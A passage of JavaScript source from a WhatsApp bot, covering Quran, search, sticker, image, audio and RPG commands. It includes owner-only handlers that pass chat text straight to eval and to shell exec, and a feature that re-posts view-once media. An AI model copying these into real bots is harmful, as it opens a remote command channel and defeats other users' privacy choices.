		listt = '*List Surah*\n\n'
		no = 0
		for (var i = 0; i < data.result.listsurah.length; i++) {
		no +=1
		listt += no.toString() + '.  '  + data.result.listsurah[i] + '\n'
		}
		reply(listt)
		})
		.catch(e =>{
reply(lang.err())
})
	db.data.users[m.sender].limit -= 1
}
	break
case 'tafsirsurah':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.quran2(prefix, command , 'Surah', 'Al-fatihah'))
	var asma = await fetchJson(api('alfa', '/api/islam/'+command, {surah : q}, 'apikey'))
	.then(async data =>{
		let listt = '*Tafsir Surah*\n\n'
		let no = 0
		for (var i = 0; i < data.result.length; i++) {
		no +=1
		listt += `• Surah : ${data.result[i].surah}\n`
		listt += `• Tafsir : ${data.result[i].tafsir}\n\n-----------------------------------\n\n`
		}
		reply(listt)
		})
		.catch(e =>{
reply(lang.err())
})
	db.data.users[m.sender].limit -= 1
}
	break
case 'alquranaudio':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `??🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if(!text) return reply(lang.quran3(prefix, command, 'Surah', 'ayat', '1','2'))
	var mon = args.join(' ')
	var m1 = mon.split("|")[0]
	var m2 = mon.split("|")[1]
	var asma = await fetchJson(api('alfa', '/api/islam/alquran-audio2', {ayat: m2, surah : m1}, 'apikey'))
	let short = asma.result.data
		let listt = '*Alquran Audio*\n\n'
		listt += `• Surah : ${short.surah.name.short} (${short.surah.name.transliteration.en})\n`
		listt += `• Arti : ${short.surah.name.translation.en} (${short.surah.name.translation.id})\n`
		listt += `• Surah ke : ${short.surah.number}\n`
		listt += `• Urutan : ${short.surah.sequence}\n`
		listt += `• Total ayat : ${short.surah.numberOfVerses}\n`
		listt += `• Wahyu : ${short.surah.revelation.arab} (${short.surah.revelation.id})\n`
		listt += `• Tafsir : ${short.surah.tafsir.id}\n\n~~~~~~~~~~~~~~~~~~~\n\n`
		listt += `• Juz : ${short.meta.juz}\n`
		listt += `• Page : ${short.meta.page}\n`
		listt += `• Manzil : ${short.meta.manzil}\n`
		listt += `• Ruku : ${short.meta.ruku}\n`
		listt += `• Quarte : ${short.meta.hizbQuarter}\n`
		listt += `• Arab : ${short.text.arab}\n`
		listt += `• Latin : ${short.text.transliteration.en}\n`
		listt += `• Tr en : ${short.translation.en}\n`
		listt += `• Tr id : ${short.translation.id}\n`
		listt += `• Tafsir short : ${short.tafsir.id.short}\n`
		listt += `• Tafsir long : ${short.tafsir.id.long}\n\n-----------------------------------\n\n`
		let aud_nya = await getBuffer(short.audio.primary)
		alpha.sendMessage(from, {audio: {url: short.audio.primary}, mimetype: 'audio/mpeg'}, {quoted:m})
		reply(listt)
		.catch(e =>{
reply(lang.err())
})
		db.data.users[m.sender].limit -= 1
}
	break
case 'awoawo':case 'benedict':case 'chat':case 'dbfly':case 'dino_kuning':case 'doge':case 'gojosatoru':case 'hope_boy':case 'jisoo':case 'kr_robot':case 'kucing':case 'lonte':case 'manusia_lidi':case 'menjamet':case 'meow':case 'nicholas':case 'patrick':case 'popoci':case 'sponsbob':case 'kawan_sponsbob':case 'tyni':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/telegram-sticker/'+command, {}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendImageAsSticker(m.chat, img, m, { packname: global.packname, author: global.author })
db.data.users[m.sender].limit -= 1
}
break
case 'brainly':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.KisahNabi(prefix, command, 'Indonesia'))
let res = await fetch(api('alfa', '/api/search/brainly', {query: text}, 'apikey'))
if (!res.ok) return await res.text()
let img = await res.json()
let answer = await img.data.map((v, i) => `_*PERTANYAAN KE ${i + 1}*_\n${v.pertanyaan}\n${v.jawaban.map((v,i) => `*JAWABAN KE ${i + 1}*\n${v.text}`).join('\n')}`).join('\n\n----------------------------------------\n\n')
m.reply(answer)
	}
	break 
case 'google': {
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(lang.KisahNabi(prefix, command, 'Indonesia'))
                google({'query': text}).then(res => {
                let teks = `*Google Search*\n_Query : ${text}_\n\n`
                for (let g of res) {
                teks += `*Title* : ${g.title}\n`
                teks += `*Description* : ${g.snippet}\n`
                teks += `*Link* : ${g.link}\n\n----------------------------------------\n\n`
                } 
                reply(teks)
                })
                db.data.users[m.sender].limit -= 1
}
                break
case 'fetch': case 'get':{
	if (text.length < 2) return reply(lang.KisahNabi(prefix, command, 'https://google.com'))
	if (!/^https?:\/\//.test(text)) throw 'Awali *URL* dengan http:// atau https://'
  let _url = new URL(text)
  let url = global.api(_url.origin, _url.pathname, Object.fromEntries(_url.searchParams.entries()), 'apikey')
  let res = await fetch(url)
  if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
    delete res
    throw `Content-Length: ${res.headers.get('content-length')}`
  }
  if (!/text|json/.test(res.headers.get('content-type'))) return alpha.sendFile(m.chat, url, 'file', lang.ok(), m)
  let txt = await res.buffer()
  try {
    txt = util.format(JSON.parse(txt+''))
  } catch (e) {
    txt = txt + ''
  } finally {
    m.reply(txt.slice(0, 65536) + '')
  }
	}
	break
                case 'nulis':
            reply(`*Pilihan Fitur Nulis*
1. ${prefix}nuliskiri
2. ${prefix}nuliskanan
3. ${prefix}foliokiri
4. ${prefix}foliokanan

Contoh:
${prefix}nuliskiri Subscribe Ya https://youtube.com/c/zeeoneofc`)
            break
        case 'nuliskiri': {
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
            if (text.length < 2) return reply(lang.KisahNabi(prefix, command, 'Support Bot WhatsApp'))
            reply(lang.wait())
            const tulisan = body.slice(11)
            const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
            const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
            spawn('convert', [
                './image/nulis/images/buku/sebelumkiri.jpg',
                '-font',
                './image/nulis/font/Indie-Flower.ttf',
                '-size',
                '960x1280',
                '-pointsize',
                '22',
                '-interline-spacing',
                '2',
                '-annotate',
                '+140+153',
                fixHeight,
                './image/nulis/images/buku/setelahkiri.jpg'
            ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    alpha.sendMessage(from, { caption: lang.ok(), image: fs.readFileSync('./image/nulis/images/buku/setelahkiri.jpg') }, { quoted: m, thumbnail: Buffer.alloc(0) })
                    
                })
            db.data.users[m.sender].limit -= 1
}
            break
        case 'nuliskanan': {
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
            if (text.length < 2) return reply(lang.KisahNabi(prefix, command, 'Support Bot WhatsApp'))
            reply(lang.wait())
            const tulisan = body.slice(12)
            const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
            const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
            spawn('convert', [
                './image/nulis/images/buku/sebelumkanan.jpg',
                '-font',
                './image/nulis/font/Indie-Flower.ttf',
                '-size',
                '960x1280',
                '-pointsize',
                '23',
                '-interline-spacing',
                '2',
                '-annotate',
                '+128+129',
                fixHeight,
                './image/nulis/images/buku/setelahkanan.jpg'
            ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    alpha.sendMessage(from, { caption: lang.ok(), image: fs.readFileSync('./image/nulis/images/buku/setelahkanan.jpg') }, { quoted: m, thumbnail: Buffer.alloc(0) })
                    
                })
            db.data.users[m.sender].limit -= 1
}
            break
        case 'foliokiri': {
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
             if (text.length < 2) return reply(lang.KisahNabi(prefix, command, 'Support Bot WhatsApp'))
            reply(lang.wait())
            const tulisan = body.slice(11)
            const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
            const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
            spawn('convert', [
                './image/nulis/images/folio/sebelumkiri.jpg',
                '-font',
                './image/nulis/font/Indie-Flower.ttf',
                '-size',
                '1720x1280',
                '-pointsize',
                '23',
                '-interline-spacing',
                '4',
                '-annotate',
                '+48+185',
                fixHeight,
                './image/nulis/images/folio/setelahkiri.jpg'
            ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    alpha.sendMessage(from, { caption: lang.ok(), image: fs.readFileSync('./image/nulis/images/folio/setelahkiri.jpg') }, { quoted: m, thumbnail: Buffer.alloc(0) })
                    
                })
            db.data.users[m.sender].limit -= 1
}
            break
        case 'foliokanan': {
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
             if (text.length < 2) return reply(lang.KisahNabi(prefix, command, 'Support Bot WhatsApp'))
            reply(lang.wait())
            const tulisan = body.slice(12)
            const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
            const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
            spawn('convert', [
                './image/nulis/images/folio/sebelumkanan.jpg',
                '-font',
                './image/nulis/font/Indie-Flower.ttf',
                '-size',
                '960x1280',
                '-pointsize',
                '23',
                '-interline-spacing',
                '3',
                '-annotate',
                '+89+190',
                fixHeight,
                './image/nulis/images/folio/setelahkanan.jpg'
            ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    alpha.sendMessage(from, { caption: lang.ok(), image: fs.readFileSync('./image/nulis/images/folio/setelahkanan.jpg') }, { quoted: m, thumbnail: Buffer.alloc(0) })
                    
                })
            db.data.users[m.sender].limit -= 1
}
            break
		case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if ((quoted.msg || quoted).seconds > 60) return reply('Maximum 60 seconds!')
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(lang.wait())
                let media = await alpha.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply(lang.err())
                let buff = fs.readFileSync(ran)
                alpha.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else reply(lang.NoAudRep(prefix, command))
                } catch (e) {
                reply(lang.err())
                
}
db.data.users[m.sender].limit -= 1
				break
                case 'adventure': {
                rpg.adventure(alpha,m, prefix)
                }
                break
				case 'open': {
                rpg.openc(alpha, m, prefix, args , command)
                }
                break
				case 'bangun':case 'build':{
					rpg.build(alpha, m, prefix, args, command)
					}
					break
				case 'berkebon':{
					rpg.berkebon(alpha, m, prefix)
					}
				break
				case 'berdagang':{
					if (!m.isGroup) return reply(lang.groupOnly())
					let whoi = m.mentionedJid[0]
					if(!whoi) return m.reply( 'Tag salah satu yang kamu ingin ajak berdagang')
					rpg.berdagang(alpha, m, prefix)
					}
					break
				case 'bansos':{
					rpg.bansos(alpha, m, prefix)
					}
					break
				case 'bank':{
					rpg.bank(alpha, m, prefix)
					}
					break
				case 'casino':{
					rpg.casino(alpha, m, prefix, args)
					}
				break
				case 'chop':{
					rpg.chop(alpha, m, prefix)
					}
					break
				case 'collect':{
					rpg.collect(alpha, m, prefix, args, command)
					}
					break
				case 'cook':{
					rpg.cook(alpha, m, prefix, args, command)
					}
					break
				case 'cd': case 'cooldown':{
					rpg.cooldown(alpha, m, prefix, args, command)
					}
				break
				case 'craft':{
					rpg.craft(alpha, m, prefix, args, command)
					}
					break
				case 'claim':case 'daily':{
					rpg.daily(alpha, m, prefix)
					}
					break
				case 'dya': case 'dno': case 'duel':{
					rpg.duel(alpha, m, prefix, args, command)
					}
					break
				case 'feed':{
					rpg.feed(alpha, m, prefix, args)
					}
					break
				case 'tokoikan': case 'fishop':{
					rpg.fishop(alpha, m, prefix, args, command)
					}
				break
				case 'hourly':{
					rpg.hourly(alpha, m, prefix)
					}
					break
                case 'inventory': case 'inv':{
                	rpg.inventory(alpha,m, prefix)
                	}
                break
				
				case 'judi':{
					rpg.judi(alpha, m, prefix, args)
					}
					break
				case 'kandang':{
					rpg.kandang(alpha, m, prefix)
					}
					break
				case 'work':case 'kerja':{
					rpg.kerja(alpha, m, prefix, args, command)
					}
					break
				case 'buyall': case 'buy':{
					rpg.buy(alpha, m, prefix, args, command)
					}
					break
				case 'koboy':{
					rpg.koboy(alpha, m, prefix, args, command, text)
					}
				break
				case 'kolam':{
					rpg.kolam(alpha, m, prefix)
					}
					break
				case 'mancing':{
					rpg.mancing(alpha, m, prefix, pushname)
					}
					break
				case 'merampok':{
					if (!m.isGroup) return reply(lang.groupOnly())
					let whoi = m.mentionedJid[0]
					if(!whoi) return m.reply( 'Tag salah satu yang kamu ingin rampok')
					rpg.merampok(alpha, m, prefix)
					}
					break
				case 'mining':{
					rpg.mining(alpha, m, prefix)
					}
					break
				case 'monthly': {
					rpg.monthly(alpha, m, prefix)
					}
				break
				case 'nabung':{
					if(!text) return m.reply(`Contoh penggunaan: ${prefix + command} 100`)
					rpg.nabung(alpha, m, prefix, args, command)
					}
					break

					case 'narik':{
					if(!text) return m.reply(`Contoh penggunaan: ${prefix + command} 100`)
					rpg.narik(alpha, m, prefix, args, command)
					}
					break
				case 'nguli':{
					rpg.nguli(alpha, m, prefix)
					}
					break
				case 'jadiojek': case 'ngojek': case 'ojek':{
					rpg.ojek(alpha, m, prefix, pushname)
					}
					break
				case 'toko': case 'pasar':{
					if(!text) return m.reply(`Contoh penggunaan : ${prefix + command} jual ayam`)
					if(!args[0] && !args[1]) return m.reply(`Contoh penggunaan : ${prefix + command} jual ayam`)
					rpg.pasar(alpha, m, prefix, args, command)
					}
				break
				case 'buy': case 'shell': case 'toko': case 'shop':{
					if(!text) return m.reply(`Contoh penggunaan : ${prefix}shop <Buy|sell> <item> <jumlah>\n*${prefix}shop buy potion 1*`)
					if(!args[0] && !args[1]) return m.reply(`Contoh penggunaan : ${prefix}shop <Buy|sell> <item> <jumlah>\n*${prefix}shop buy potion 1*`)
					rpg.shop(alpha, m, prefix, args, command)
					}
					break
				case 'slot':{
					rpg.slot(alpha, m, prefix, args, command, text)
					}
					break
				case 'transfer':{
					rpg.transfer(alpha, m, prefix, args)
					}
					break
				case 'heal': case 'use':{
					rpg.use(alpha, m, prefix, args, command)
					}
					break
				case 'weekly': {
					rpg.weekly(alpha, m, prefix)
					}
				break
				case 'berburu': {
					rpg.berburu(alpha, m, prefix)
					}
				break
				case 'ceklimit': case 'checklimit': case 'limit':{
					m.reply(lang.limitLu(db.data.users[m.sender].limit))
					}
					break 
 default:
 if ((budy) && ["p", "proses", "Proses", "P"].includes(budy) && !isCmd) {
            if (!m.isGroup) return
if (!isGroupAdmins && !isGroupOwner && !isCreator) return
if (!m.quoted) return reply(lang.LockCmd())
            let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
            let proses = (db.data.chats[m.chat].setProses || `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan :\n@catatan\n\nPesanan @user sedang di proses!`).replace('@tanggal', `${tanggal(new Date())}`).replace('@jam', time).replace('@catatan', `${tek ? tek : '-'}`).replace('@user', '@' + m.quoted.sender.split('@')[0])
            alpha.sendTextWithMentions(m.chat, proses, m)}
            
            
        if ((budy) && ["d", 'done', "Done", "D"].includes(budy) && !isCmd) {
            if (!m.isGroup) return
if (!isGroupAdmins && !isGroupOwner && !isCreator) return 
if (!m.quoted) return reply(lang.LockCmd())
            let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
            let sukses = (db.data.chats[m.chat].setDone || `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Berhasil\`\`\`\n\n📝 Catatan :\n@catatan\n\nTerimakasih @user Next Order ya🙏`).replace('@tanggal', `${tanggal(new Date())}`).replace('@jam', time).replace('@catatan', `${tek ? tek : '-'}`).replace('@user', '@' + m.quoted.sender.split('@')[0])
            alpha.sendTextWithMentions(m.chat, sukses, m)}
            

if (budy.startsWith('=>')) {
if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
 if (sat == undefined) {
 bang = util.format(sul)
 }
 return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!m.key.fromMe && !isCreator) return m.reply(lang.ownerOnly())
try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }


if (budy.startsWith('<')) {
if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('$')) {
if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
mengtermuk = budy.slice(2)
exec(mengtermuk, (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(`*${botname}*\nEXEC: ${mengtermuk}\n\n${stdout}`)
})
}
}

//Anti View Once

if (m.mtype == 'viewOnceMessage') {
	if (!db.data.chats[m.chat].antionce) return
 let msg = m.message.viewOnceMessage.message
        let type = Object.keys(msg)[0]
        let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
        let buffer = Buffer.from([])
        for await (const chunk of media) {
            buffer = Buffer.concat([buffer, chunk])
        }
        if (/video/.test(type)) {
            return alpha.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
        } else if (/image/.test(type)) {
            return alpha.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
        }
}       

} catch (err) {
console.log(err)
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})